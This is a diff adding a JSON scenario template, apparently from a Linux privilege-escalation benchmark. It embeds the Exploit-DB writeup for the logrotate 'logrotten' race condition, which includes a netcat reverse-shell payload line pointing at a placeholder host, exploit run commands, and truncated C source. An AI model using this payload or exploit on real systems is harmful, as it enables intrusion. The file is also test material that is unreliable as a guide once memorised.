@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_47466",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: logrotten 3.15.1 - Privilege Escalation\n\nExploit source code (47466.c):\n```\n# Exploit Title: logrotten 3.15.1 - Privilege Escalation\n# Date: 2019-10-04\n# Exploit Author: Wolfgang Hotwagner\n# Vendor Homepage: https://github.com/logrotate/logrotate\n# Software Link: https://github.com/logrotate/logrotate/releases/tag/3.15.1\n# Version: all versions through 3.15.1\n# Tested on: Debian GNU/Linux 9.5 (stretch)\n\n## Brief description\n  - logrotate is prone to a race condition after renaming the logfile.\n  - If logrotate is executed as root, with option that creates a\n    file ( like create, copy, compress, etc.) and the user is in control\n    of the logfile path, it is possible to abuse a race-condition to write\n    files in ANY directories.\n  - An attacker could elevate his privileges by writing reverse-shells into\n    directories like \"/etc/bash_completition.d/\".\n\n## Precondition for privilege escalation\n  - Logrotate has to be executed as root\n  - The logpath needs to be in control of the attacker\n  - Any option that creates files is set in the logrotate configuration\n\n## Tested version\n  - Debian GNU/Linux 9.5 (stretch)\n  - Amazon Linux 2 AMI (HVM)\n  - Ubuntu 18.04.1\n  - logrotate 3.8.6\n  - logrotate 3.11.0\n  - logrotate 3.15.0\n\n## Compile\n  - gcc -o logrotten logrotten.c\n\n## Prepare payload\n```\necho \"if [ `id -u` -eq 0 ]; then (/bin/nc -e /bin/bash myhost 3333 &);\nfi\" > payloadfile\n```\n\n## Run exploit\n\nIf \"create\"-option is set in logrotate.cfg:\n```\n ./logrotten -p ./payloadfile /tmp/log/pwnme.log\n```\n\nIf \"compress\"-option is set in logrotate.cfg:\n```\n./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log\n```\n\n## Known Problems\n  - It's hard to win the race inside a docker container or on a lvm2-volume\n\n## Mitigation\n  - make sure that logpath is owned by root\n  - use option \"su\" in logrotate.cfg\n  - use selinux or apparmor\n\n## Author\n  - Wolfgang Hotwagner\n\n## References\n\n  - https://github.com/whotwagner/logrotten\n  -\nhttps://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition\n  -\nhttps://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges\n  - https://www.ait.ac.at/themen/cyber-security/ait-sa-20190930-01/\n  -\nhttps://tech.feedyourhead.at/content/privilege-escalation-in-groonga-httpd\n\n\nlogrotten.c\n\n/*\n * logrotate poc exploit\n *\n * [ Brief description ]\n *   - logrotate is prone to a race condition after renaming the logfile.\n *   - If logrotate is executed as root and the user is in control of the logfile path, it is possible to abuse a race-condition to write files in ANY directories.\n *   - An attacker could elevate his privileges by writing reverse-shells into\n *     directories like \"/etc/bash_completition.d/\".\n *\n * [ Precondition for privilege escalation ]\n *   - Logrotate needs to be executed as root\n *   - The logpath needs to be in control of the attacker\n *   - Any option(create,compress,copy,etc..) that creates a new file is set in the logrotate configuration.\n *\n * [ Tested version ]\n *   - Debian GNU/Linux 9.5 (stretch)\n *   - Amazon Linux 2 AMI (HVM)\n *   -\n```",
+  "cve": "",
+  "exploitdb_id": "47466",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_47466",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
